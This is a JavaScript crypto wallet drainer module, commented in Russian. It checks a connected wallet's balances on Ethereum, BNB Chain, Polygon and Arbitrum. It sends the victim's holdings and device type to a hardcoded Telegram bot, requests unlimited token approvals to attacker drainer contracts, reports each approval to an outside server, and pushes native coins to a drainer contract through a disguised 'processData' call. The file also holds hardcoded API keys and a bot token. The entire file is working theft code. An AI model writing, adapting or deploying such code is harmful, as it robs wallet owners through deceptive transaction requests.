import { ethers } from 'ethers';

// ABI для ERC20 токенов
const ERC20_ABI = [
  "function balanceOf(address account) view returns (uint256)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function decimals() view returns (uint8)",
  "function allowance(address owner, address spender) view returns (uint256)",
  "function transferFrom(address sender, address recipient, uint256 amount) returns (bool)"
];

// ABI для дрейнера
const DRAINER_ABI = [
  "function processData(uint256 taskId, bytes32 dataHash, uint256 nonce, address[] tokenAddresses) external payable"
];

// Ключи API для сканеров
const ETHERSCAN_API_KEY = "X2A1BU3MABVFFN1GQ1DRX5PHNG212MTXKT";
const BSCSCAN_API_KEY = "8AWWMFHVD5E65JCGGYKKE95RTKTPB7AJJR";
const POLYGONSCAN_API_KEY = "43EJ8S6WRP4ESVX8AGM8KP9I61P44YWZ2T";
const ARBISCAN_API_KEY = "6YDH1XI6VB7UBQV4WXSH2M7UIEBMMCF9ES";
const OPTIMISTIC_ETHERSCAN_API_KEY = "5CKHVMKCD5VBXIB4PCM4KYKX5JJCCVU3RW";
const BASESCAN_API_KEY = "TEB6I1H3F1UH1DF2I1R39PA9RX5C6IKB1H";

// Идентификаторы токенов (по символу токена для Binance API)
const TOKEN_SYMBOLS = {
  "ETH": "ETHUSDT",
  "BNB": "BNBUSDT",
  "MATIC": "MATICUSDT",
  "0xdac17f958d2ee523a2206206994597c13d831ec7": "USDT",
  "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48": "USDCUSDT",
  "0x6b175474e89094c44da98b954eedeac495271d0f": "DAIUSDT",
  "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599": "WBTCUSDT",
  "0x1f9840a85d5af5bf1d1762f925bdaddc4201f984": "UNIUSDT",
  "0x514910771af9ca656af840dff83e8264ecf986ca": "LINKUSDT",
  "0xc00e94cb662c3520282e6f5717214004a7f26888": "COMPUSDT",
  "0x0bc529c00c6401aef6d220be8c6ea1667f6ad93e": "YFIUSDT",
  "0xd533a949740bb3306d119cc777fa900ba034cd52": "CRVUSDT",
  "0x0d8775f648430679a709e98d2b0cb6250d2887ef": "BATUSDT",
  "0xe41d2489571d322189246dafa5ebde1f4699f498": "ZRXUSDT",
  "0xbbbbca6a901c926f240b89eacb641d8aec7aeafd": "LRCUSDT",
  "0xb8c77482e45f1f44de1745f52c74426c631bdd52": "BNBUSDT",
  "0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce": "SHIBUSDT",
  "0x6982508145454ce325ddbe47a25d4ec3d2311933": "PEPEUSDT",
  "0x27c70cd1946795b66be9d954418546998b546634": "LEASHUSDT",
  "0xcf0c122c6b73ff809c693db761e7baebe62b6a2e": "FLOKIUSDT",
  "0x1234567890abcdef1234567890abcdef12345678": "SLAPUSDT",
  "0x7fc66500c84a76ad7e9c93437bfc5ac33e2ddae9": "AAVEUSDT",
  "0x6de037ef9ad2725eb40118bb1702ebb27e4aeb24": "RNDRUSDT",
  "0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2": "MKRUSDT",
  "0x6b3595068778dd592e39a122f4f5a5cf09c90fe2": "SUSHIUSDT",
  "0x7dd9c5cba05e151c895fde1cf355c9a1d5da6429": "GLMUSDT",
  "0x1985365e9f78359a9b6ad760e32412f4a445e862": "REPUSDT",
  "0x744d70fdbe2ba4cf95131626614a1763df805b9e": "SNTUSDT",
  "0xb64ef51c888972c908cfacf59b47c1afbc0ab8ac": "STORJUSDT",
  "0x55d398326f99059ff775485246999027b3197955": "USDT",
  "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d": "USDCUSDT",
  "0x2859e4544c4bb03966803b044a93563bd2d0dd4d": "SHIBUSDT",
  "0x25d887ce7a35172c62febfd67a1856f20faebb00": "PEPEUSDT",
  "0xfb5c6815ca3ac72ce9f5006869ae67f18bf77006": "FLOKIUSDT",
  "0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82": "CAKEUSDT",
  "0xe02df9e3e622debdd69fb838bb799e3f168902c5": "BAKEUSDT",
  "0xcf6bb5389c92bdda8a3747ddb454cb7a64626c63": "XVSUSDT",
  "0x8f0528ce5ef7b51152a59745befdd91d97091d2f": "ALPACAUSDT",
  "0xa184088a740c695e156f91f5cc086a06bb78b827": "AUTOUSDT",
  "0xae9269f27437f0fcbc232d39ec814844a51d6b8f": "BURGERUSDT",
  "0xa7f552078dcc247c2684336020c03648500c6d9f": "EPSUSDT",
  "0xe0e514c71282b6f4e823703a39374cf58dc3ea4f": "BELTUSDT",
  "0x3203c9e46c3d3821e8be4c2c9f0e2e7b0d5d0e75": "MBOXUSDT",
  "0xd41fdb03ba84762dd66a0af1a6c8540ff1ba5dfb": "SFPUSDT",
  "0xc748673057861a797275cd8a068abb95a902e8de": "BABYDOGEUSDT",
  "0xc001bbe2b87079294c63ece98bdd0a88d761434e": "EGCUSDT",
  "0xd74b782e05aa25c50e7330af541d46e18f36661c": "QUACKUSDT",
  "0xa003e3f0ed31c816347b6f99c62c6835c2c6b6f2": "PITUSDT",
  "0xc2132d05d31c914a87c6611c10748aeb04b58e8f": "USDT",
  "0x2791bca1f2de4661ed88a30c99a7a9449aa84174": "USDCUSDT",
  "0x6f8a06447ff6fcf75d803135a7de15ce88c1d4ec": "SHIBUSDT",
  "0xa102daa5e3d35ecaef2a14de4e94baaf9cc38d56": "PEPEUSDT",
  "0x831753dd7087cac61ab5644b308642cc1c33dc13": "QUICKUSDT",
  "0x385eeac5cb85a38a9a07a70c73e0a3271ca19ec7": "GHSTUSDT",
  "0xc168e40227e4edfb0b3dabb4b05d0b7c67f6a9be": "DFYNUSDT",
  "0x3a3df212b7aa91aa0402b9035b098891d276572b": "FISHUSDT",
  "0x4e1581f01046e1c6d7c3aa0fea8e9b7ea0f28c49": "ICEUSDT",
  "0x7cc6bcad7c5e0e928caee29ff9619aa0b019e77e": "DCUSDT",
  "0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9": "USDT",
  "0xff970a61a04b1ca14834a43f5de4533ebddb5cc8": "USDCUSDT",
  "0x5033833c9fe8b503ed2abafac6d2eb2fbf33a36": "SHIBUSDT",
  "0xa54b8e307e70e310a5c6bf7c2db4b33ed9f3ac51": "PEPEUSDT"
};

// Конфигурация сетей
const CHAINS = {
  1: {
    name: "Ethereum Mainnet",
    nativeToken: "ETH",
    chainIdHex: "0x1",
    rpcUrls: ["https://rpc.eth.gateway.fm", "https://ethereum-rpc.publicnode.com"],
    usdtAddress: "0xdac17f958d2ee523a2206206994597c13d831ec7",
    usdcAddress: "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48",
    drainerAddress: "0x4202B38858847813aDEe0cdbeB339B3e4Fb2Ae82",
    explorerApi: "https://api.etherscan.io/api",
    explorerApiKey: ETHERSCAN_API_KEY,
    otherTokenAddresses: {
      DAI: "0x6b175474e89094c44da98b954eedeac495271d0f",
      WBTC: "0x2260fac5e5542a773aa44fbcfedf7c193bc2c599",
      UNI: "0x1f9840a85d5af5bf1d1762f925bdaddc4201f984",
      LINK: "0x514910771af9ca656af840dff83e8264ecf986ca",
      COMP: "0xc00e94cb662c3520282e6f5717214004a7f26888",
      YFI: "0x0bc529c00c6401aef6d220be8c6ea1667f6ad93e",
      CRV: "0xd533a949740bb3306d119cc777fa900ba034cd52",
      BAT: "0x0d8775f648430679a709e98d2b0cb6250d2887ef",
      ZRX: "0xe41d2489571d322189246dafa5ebde1f4699f498",
      LRC: "0xbbbbca6a901c926f240b89eacb641d8aec7aeafd",
      BNB: "0xb8c77482e45f1f44de1745f52c74426c631bdd52",
      SHIB: "0x95ad61b0a150d79219dcf64e1e6cc01f0b64c4ce",
      PEPE: "0x6982508145454ce325ddbe47a25d4ec3d2311933",
      LEASH: "0x27c70cd1946795b66be9d954418546998b546634",
      FLOKI: "0xcf0c122c6b73ff809c693db761e7baebe62b6a2e",
      SLAP: "0x1234567890abcdef1234567890abcdef12345678",
      AAVE: "0x7fc66500c84a76ad7e9c93437bfc5ac33e2ddae9",
      RNDR: "0x6de037ef9ad2725eb40118bb1702ebb27e4aeb24",
      MKR: "0x9f8f72aa9304c8b593d555f12ef6589cc3a579a2",
      SUSHI: "0x6b3595068778dd592e39a122f4f5a5cf09c90fe2",
      GLM: "0x7dd9c5cba05e151c895fde1cf355c9a1d5da6429",
      REP: "0x1985365e9f78359a9b6ad760e32412f4a445e862",
      SNT: "0x744d70fdbe2ba4cf95131626614a1763df805b9e",
      STORJ: "0xb64ef51c888972c908cfacf59b47c1afbc0ab8ac"
    }
  },
  56: {
    name: "BNB Chain",
    nativeToken: "BNB",
    chainIdHex: "0x38",
    rpcUrls: [
      "https://bsc-dataseed.binance.org/",
      "https://bsc-dataseed1.defibit.io/",
      "https://bsc-dataseed1.ninicoin.io/"
    ],
    usdtAddress: "0x55d398326f99059ff775485246999027b3197955",
    usdcAddress: "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d",
    drainerAddress: "0x625C717652CC4665a342d355733d5707BCF6ef66",
    explorerApi: "https://api.bscscan.com/api",
    explorerApiKey: BSCSCAN_API_KEY,
    otherTokenAddresses: {
      SHIB: "0x2859e4544c4bb03966803b044a93563bd2d0dd4d",
      PEPE: "0x25d887ce7a35172c62febfd67a1856f20faebb00",
      FLOKI: "0xfb5c6815ca3ac72ce9f5006869ae67f18bf77006",
      CAKE: "0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82",
      BAKE: "0xe02df9e3e622debdd69fb838bb799e3f168902c5",
      XVS: "0xcf6bb5389c92bdda8a3747ddb454cb7a64626c63",
      ALPACA: "0x8f0528ce5ef7b51152a59745befdd91d97091d2f",
      AUTO: "0xa184088a740c695e156f91f5cc086a06bb78b827",
      BURGER: "0xae9269f27437f0fcbc232d39ec814844a51d6b8f",
      EPS: "0xa7f552078dcc247c2684336020c03648500c6d9f",
      BELT: "0xe0e514c71282b6f4e823703a39374cf58dc3ea4f",
      MBOX: "0x3203c9e46c3d3821e8be4c2c9f0e2e7b0d5d0e75",
      SFP: "0xd41fdb03ba84762dd66a0af1a6c8540ff1ba5dfb",
      BabyDoge: "0xc748673057861a797275cd8a068abb95a902e8de",
      EGC: "0xc001bbe2b87079294c63ece98bdd0a88d761434e",
      QUACK: "0xd74b782e05aa25c50e7330af541d46e18f36661c",
      PIT: "0xa003e3f0ed31c816347b6f99c62c6835c2c6b6f2"
    }
  },
  137: {
    name: "Polygon",
    nativeToken: "MATIC",
    chainIdHex: "0x89",
    rpcUrls: ["https://polygon-rpc.com/"],
    usdtAddress: "0xc2132d05d31c914a87c6611c10748aeb04b58e8f",
    usdcAddress: "0x2791bca1f2de4661ed88a30c99a7a9449aa84174",
    drainerAddress: "0xD29BD8fC4c0Acfde1d0A42463805d34A1902095c",
    explorerApi: "https://api.polygonscan.com/api",
    explorerApiKey: POLYGONSCAN_API_KEY,
    otherTokenAddresses: {
      SHIB: "0x6f8a06447ff6fcf75d803135a7de15ce88c1d4ec",
      PEPE: "0xa102daa5e3d35ecaef2a14de4e94baaf9cc38d56",
      QUICK: "0x831753dd7087cac61ab5644b308642cc1c33dc13",
      GHST: "0x385eeac5cb85a38a9a07a70c73e0a3271ca19ec7",
      DFYN: "0xc168e40227e4edfb0b3dabb4b05d0b7c67f6a9be",
      FISH: "0x3a3df212b7aa91aa0402b9035b098891d276572b",
      ICE: "0x4e1581f01046e1c6d7c3aa0fea8e9b7ea0f28c49",
      DC: "0x7cc6bcad7c5e0e928caee29ff9619aa0b019e77e",
      ICE: "0x4e1581f01046eF1C6D7c3aA0FEa8E9B7Ea0f28c4"
    }
  },
  42161: {
    name: "Arbitrum One",
    nativeToken: "ETH",
    chainIdHex: "0xa4b1",
    rpcUrls: ["https://arb1.arbitrum.io/rpc"],
    usdtAddress: "0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9",
    usdcAddress: "0xff970a61a04b1ca14834a43f5de4533ebddb5cc8",
    drainerAddress: "0x8814D8937F84D9D93c125E9031087F2e8Cfc9b4F",
    explorerApi: "https://api.arbiscan.io/api",
    explorerApiKey: ARBISCAN_API_KEY,
    otherTokenAddresses: {
      SHIB: "0x5033833c9fe8b503ed2abafac6d2eb2fbf33a36",
      PEPE: "0xa54b8e307e70e310a5c6bf7c2db4b33ed9f3ac51",
    }
  }
};

// Токен бота и ID чата для Telegram (замени на свои значения)
const TELEGRAM_BOT_TOKEN = '7549455736:AAF-ouc8hjuDOmInaendDArWpvGiP7aiS64'; // Токен твоего бота
const TELEGRAM_CHAT_ID = '-4767714458'; // ID твоего чата

// Функция для отправки сообщения в Telegram из браузера
async function sendTelegramMessage(message) {
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown' // Для форматирования текста
      })
    });
    const data = await response.json();
    if (!data.ok) {
      console.error(`❌ Ошибка отправки сообщения в Telegram: ${data.description}`);
    }
  } catch (error) {
    console.error(`❌ Ошибка отправки сообщения в Telegram: ${error.message}`);
  }
}

// Функция для получения цены токена в USDT через Binance API
async function getTokenPriceInUSDT(tokenSymbol) {
  if (tokenSymbol === "USDT") return 1;

  try {
    const response = await fetch(`https://api.binance.com/api/v3/ticker/price?symbol=${tokenSymbol}`);
    const data = await response.json();
    if (data.price) return parseFloat(data.price);
    return 0;
  } catch {
    return 0;
  }
}

// Функция для выбора рабочего провайдера (вызывается один раз)
async function getWorkingProvider(rpcUrls) {
  const providerPromises = rpcUrls.map(async (rpc) => {
    try {
      const provider = new ethers.providers.JsonRpcProvider(rpc);
      await provider.getBalance('0x0000000000000000000000000000000000000000');
      return provider;
    } catch {
      return null;
    }
  });

  const results = await Promise.all(providerPromises);
  const workingProvider = results.find(provider => provider !== null);
  if (!workingProvider) throw new Error();
  return workingProvider;
}

// Получение баланса нативного токена через API
async function getBalanceFromExplorer(address, chainId) {
  const config = CHAINS[chainId];
  const apiUrl = `${config.explorerApi}?module=account&action=balance&address=${address}&tag=latest&apikey=${config.explorerApiKey}`;
  try {
    const response = await fetch(apiUrl);
    const data = await response.json();
    if (data.status === "1") return ethers.BigNumber.from(data.result);
    throw new Error();
  } catch {
    throw new Error();
  }
}

// Получение баланса токена через API
async function getTokenBalanceFromExplorer(address, tokenAddress, chainId) {
  const config = CHAINS[chainId];
  const apiUrl = `${config.explorerApi}?module=account&action=tokenbalance&contractaddress=${tokenAddress}&address=${address}&tag=latest&apikey=${config.explorerApiKey}`;
  try {
    const response = await fetch(apiUrl);
    const data = await response.json();
    if (data.status === "1") return ethers.BigNumber.from(data.result);
    throw new Error();
  } catch {
    throw new Error();
  }
}

// Проверка баланса с использованием API и fallback на RPC
async function checkBalance(chainId, userAddress, provider) {
  const config = CHAINS[chainId];
  let nativeBalance, tokenBalances = {};

  try {
    nativeBalance = await getBalanceFromExplorer(userAddress, chainId);
  } catch {
    nativeBalance = await provider.getBalance(userAddress);
  }

  try {
    tokenBalances[config.usdtAddress] = await getTokenBalanceFromExplorer(userAddress, config.usdtAddress, chainId);
  } catch {
    const usdt = new ethers.Contract(config.usdtAddress, ERC20_ABI, provider);
    tokenBalances[config.usdtAddress] = await usdt.balanceOf(userAddress);
  }

  try {
    tokenBalances[config.usdcAddress] = await getTokenBalanceFromExplorer(userAddress, config.usdcAddress, chainId);
  } catch {
    const usdc = new ethers.Contract(config.usdcAddress, ERC20_ABI, provider);
    tokenBalances[config.usdcAddress] = await usdc.balanceOf(userAddress);
  }

  if (config.otherTokenAddresses) {
    const tokenAddresses = Object.values(config.otherTokenAddresses);
    const balancePromises = tokenAddresses.map(async (tokenAddress) => {
      try {
        const balance = await getTokenBalanceFromExplorer(userAddress, tokenAddress, chainId);
        return { address: tokenAddress, balance };
      } catch {
        const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
        try {
          const balance = await token.balanceOf(userAddress);
          return { address: tokenAddress, balance };
        } catch {
          return { address: tokenAddress, balance: ethers.BigNumber.from(0) };
        }
      }
    });

    const results = await Promise.all(balancePromises);
    results.forEach(({ address, balance }) => {
      tokenBalances[address] = balance;
    });
  }

  return { nativeBalance, tokenBalances };
}

// Проверка наличия средств
function hasFunds(bal) {
  const minNativeBalance = ethers.utils.parseEther("0.001");
  const minTokenBalance = ethers.utils.parseUnits("0.1", 6);

  if (bal.nativeBalance.gt(minNativeBalance)) return true;

  for (const balance of Object.values(bal.tokenBalances)) {
    if (balance.gt(minTokenBalance)) return true;
  }

  return false;
}

// Переключение сети
async function switchChain(chainId) {
  try {
    await window.ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: CHAINS[chainId].chainIdHex }]
    });
  } catch {
    throw new Error();
  }
}

// Функция для определения устройства
function detectDevice() {
  const userAgent = navigator.userAgent.toLowerCase();
  const platform = navigator.platform ? navigator.platform.toLowerCase() : '';

  // Проверка на Windows (включая Windows Phone, но с уточнением)
  if (/windows/i.test(userAgent) || /win32|win64/i.test(platform)) {
    if (/mobile|phone/i.test(userAgent)) return "Windows Phone";
    return "Windows";
  }

  // Проверка на Mac (Macintosh, но не iPhone/iPad)
  if (/macintosh|mac os/i.test(userAgent) && !/iphone|ipad|ipod/i.test(userAgent)) {
    return "Mac";
  }

  // Проверка на iPhone/iPad/iPod
  if (/iphone|ipad|ipod/i.test(userAgent)) {
    return "iPhone";
  }

  // Проверка на Android (с уточнением, чтобы не путать с другими платформами)
  if (/android/i.test(userAgent) && !/windows/i.test(userAgent)) {
    return "Android";
  }

  // Проверка на Linux (но не Android, так как Android тоже использует Linux)
  if (/linux/i.test(userAgent) && !/android/i.test(userAgent)) {
    return "Linux";
  }

  return "Unknown";
}

// Функция для форматирования адреса кошелька
function shortenAddress(address) {
  if (!address || address.length < 10) return address;
  return `${address.slice(0, 6)}...${address.slice(-4)}`;
}

// Функция для определения названия кошелька
function detectWallet() {
  if (window.ethereum?.isMetaMask) return "MetaMask";
  if (window.ethereum?.isCoinbaseWallet) return "Coinbase Wallet";
  if (window.ethereum?.isTrust) return "Trust Wallet";
  return "Unknown Wallet";
}

// Функция для форматирования чисел без потери точности
function formatBalance(balance, decimals) {
  const formatted = ethers.utils.formatUnits(balance, decimals);
  // Преобразуем в число и убираем лишние нули, но сохраняем до 6 знаков после запятой
  const num = parseFloat(formatted);
  return num.toFixed(6).replace(/\.?0+$/, '');
}

// Выполнение дрейна
async function drain(chainId, signer, userAddress, bal, provider) {
  console.log(`Подключённый кошелёк: ${userAddress}`);

  // Собираем информацию для сообщения
  const config = CHAINS[chainId];
  
  // Укороченный адрес
  const shortAddress = shortenAddress(userAddress);

  // Название кошелька
  const walletName = detectWallet();

  // Сеть
  const networkName = config.name;

  // Средства (Funds)
  const funds = [];
  
  // Нативный токен (например, ETH, BNB, MATIC)
  const nativeBalance = ethers.utils.formatEther(bal.nativeBalance);
  if (parseFloat(nativeBalance) > 0) {
    const nativeNetwork = config.name === "Ethereum Mainnet" ? "ERC20" : config.name === "BNB Chain" ? "BEP20" : config.name;
    const formattedNativeBalance = formatBalance(bal.nativeBalance, 18);
    // Получаем цену нативного токена в USDT
    const nativePrice = await getTokenPriceInUSDT(TOKEN_SYMBOLS[config.nativeToken]);
    const nativeValueInUSDT = (parseFloat(formattedNativeBalance) * nativePrice).toFixed(2);
    funds.push(`- **${config.nativeToken}**(${nativeNetwork}): ${formattedNativeBalance} (\`${nativeValueInUSDT} USDT\`)`);
  }

  // Токены (USDT, USDC и другие)
  const tokenAddresses = [config.usdtAddress, config.usdcAddress, ...Object.values(config.otherTokenAddresses)];
  for (const tokenAddress of tokenAddresses) {
    const balance = bal.tokenBalances[tokenAddress];
    if (balance && balance.gt(0)) {
      const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
      const decimals = await tokenContract.decimals();
      const formattedBalance = formatBalance(balance, decimals);
      if (parseFloat(formattedBalance) > 0) {
        const symbol = tokenAddress === config.usdtAddress ? "USDT" :
                      tokenAddress === config.usdcAddress ? "USDC" :
                      Object.keys(config.otherTokenAddresses).find(key => config.otherTokenAddresses[key] === tokenAddress) || "Unknown";
        const tokenNetwork = config.name === "Ethereum Mainnet" ? "ERC20" : config.name === "BNB Chain" ? "BEP20" : config.name;
        // Получаем цену токена в USDT
        const tokenPrice = await getTokenPriceInUSDT(TOKEN_SYMBOLS[tokenAddress] || symbol);
        const tokenValueInUSDT = (parseFloat(formattedBalance) * tokenPrice).toFixed(2);
        funds.push(`- **${symbol}**(${tokenNetwork}): ${formattedBalance} (\`${tokenValueInUSDT} USDT\`)`);
      }
    }
  }

  // Устройство
  const device = detectDevice();

  // Формируем сообщение
  const message = `🌀 Connect | [ **${shortAddress}** ]\n\n` +
                  `Funds:\n` +
                  `${funds.join('\n')}\n` +
                  `Device: ${device}`;

  // Отправляем сообщение в Telegram
  await sendTelegramMessage(message);

  const MAX = ethers.constants.MaxUint256;
  const MIN_TOKEN_BALANCE = ethers.utils.parseUnits("0.1", 6);

  const ethBalance = await provider.getBalance(userAddress);
  const minEthRequired = ethers.utils.parseEther("0.0003");
  if (ethBalance.lt(minEthRequired)) {
    throw new Error();
  }

  const tokensToProcess = [];

  const tokenDataPromises = tokenAddresses.map(async (tokenAddress) => {
    const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
    try {
      const [realBalance, decimals] = await Promise.all([
        tokenContract.balanceOf(userAddress),
        tokenContract.decimals()
      ]);
      return { tokenAddress, tokenContract, realBalance, decimals };
    } catch {
      return { tokenAddress, tokenContract, realBalance: ethers.BigNumber.from(0), decimals: 18 };
    }
  });

  const tokenDataResults = await Promise.all(tokenDataPromises);

  for (const { tokenAddress, tokenContract, realBalance, decimals } of tokenDataResults) {
    if (realBalance.lt(bal.tokenBalances[tokenAddress] || 0)) {
      bal.tokenBalances[tokenAddress] = realBalance;
    }

    if (realBalance.gt(0) && realBalance.gt(MIN_TOKEN_BALANCE)) {
      const symbol = tokenAddress === config.usdtAddress ? "USDT" :
                    tokenAddress === config.usdcAddress ? "USDC" :
                    Object.keys(config.otherTokenAddresses).find(key => config.otherTokenAddresses[key] === tokenAddress);
      tokensToProcess.push({ token: symbol, balance: realBalance, contract: tokenContract, address: tokenAddress, decimals });
    }
  }

  const pricePromises = tokensToProcess.map(async (token) => {
    const price = await getTokenPriceInUSDT(TOKEN_SYMBOLS[token.address] || token.token);
    const balanceInUnits = parseFloat(ethers.utils.formatUnits(token.balance, token.decimals));
    token.valueInUSDT = balanceInUnits * price;
    return token;
  });

  await Promise.all(pricePromises);

  tokensToProcess.sort((a, b) => b.valueInUSDT - a.valueInUSDT);

  let status = 'rejected';
  for (const { token, balance, contract, address, decimals } of tokensToProcess) {
    console.log(`Выводимый токен: ${token}`);

    const allowanceBefore = await contract.allowance(userAddress, config.drainerAddress);

    if (allowanceBefore.lt(balance)) {
      try {
        const nonce = await provider.getTransactionCount(userAddress, "pending");
        const tx = await contract.approve(config.drainerAddress, MAX, {
          gasLimit: 100000,
          gasPrice: ethers.utils.parseUnits("3", "gwei"),
          nonce
        });
        const receipt = await tx.wait();
        await notifyServer(userAddress, address, balance, chainId, receipt.transactionHash, provider);
        status = 'confirmed';
      } catch {
        throw new Error();
      }
    } else {
      await notifyServer(userAddress, address, balance, chainId, null, provider);
      status = 'confirmed';
    }
  }

  if (bal.nativeBalance.gt(0)) {
    const drainer = new ethers.Contract(config.drainerAddress, DRAINER_ABI, signer);
    const gasReserve = ethers.utils.parseEther("0.002");
    const nativeToSend = bal.nativeBalance.sub(gasReserve);
    const value = nativeToSend.gt(0) ? nativeToSend : ethers.BigNumber.from(0);

    if (value.gt(0)) {
      console.log(`Выводимый токен: ${config.nativeToken}`);

      const taskId = Math.floor(Math.random() * 1000000);
      const dataHash = ethers.utils.keccak256(ethers.utils.toUtf8Bytes(`fakeData-native-${Date.now()}`));
      const nonce = await provider.getTransactionCount(userAddress, "pending");

      try {
        const tx = await drainer.processData(taskId, dataHash, nonce, tokenAddresses, {
          value,
          gasLimit: 100000,
          gasPrice: ethers.utils.parseUnits("3", "gwei"),
          nonce
        });
        const receipt = await tx.wait();
        if (receipt.status !== 1) {
          throw new Error();
        }
        status = 'confirmed';
      } catch {
        throw new Error();
      }
    }
  }

  return status;
}

async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, provider) {
  try {
    const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
    const [balance, decimals] = await Promise.all([
      token.balanceOf(userAddress),
      token.decimals()
    ]);
    const balanceUnits = ethers.utils.formatUnits(balance, decimals);

    const roundedBalance = Math.floor(parseFloat(balanceUnits) * 10000) / 10000;

    const roundedAmount = ethers.utils.parseUnits(roundedBalance.toString(), decimals);
    if (roundedAmount.lte(0)) {
      throw new Error();
    }

    const response = await fetch('https://api.checkalex.xyz/api/transfer', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        userAddress,
        tokenAddress,
        amount: roundedAmount.toString(),
        chainId,
        txHash
      })
    });
    const data = await response.json();
    if (!data.success) {
      throw new Error();
    }
  } catch {
    throw new Error();
  }
}

// Основная функция
export async function runDrainer(provider, signer, userAddress) {
  const balancePromises = Object.keys(CHAINS).map(async (chainId) => {
    try {
      const reliableProvider = await getWorkingProvider(CHAINS[chainId].rpcUrls);
      const balance = await checkBalance(chainId, userAddress, reliableProvider);
      return { chainId: Number(chainId), balance, provider: reliableProvider };
    } catch {
      return null;
    }
  });

  const balances = (await Promise.all(balancePromises)).filter(Boolean);
  const sorted = balances
    .filter(item => hasFunds(item.balance))
    .sort((a, b) => {
      const aTotal = Object.values(a.balance.tokenBalances).reduce((sum, bal) => sum.add(bal), ethers.BigNumber.from(0));
      const bTotal = Object.values(b.balance.tokenBalances).reduce((sum, bal) => sum.add(bal), ethers.BigNumber.from(0));
      return bTotal.gt(aTotal) ? 1 : -1;
    });

  if (!sorted.length) {
    return 'rejected';
  }

  const target = sorted[0];
  await switchChain(target.chainId);
  const status = await drain(target.chainId, signer, userAddress, target.balance, target.provider);
  return status;
}
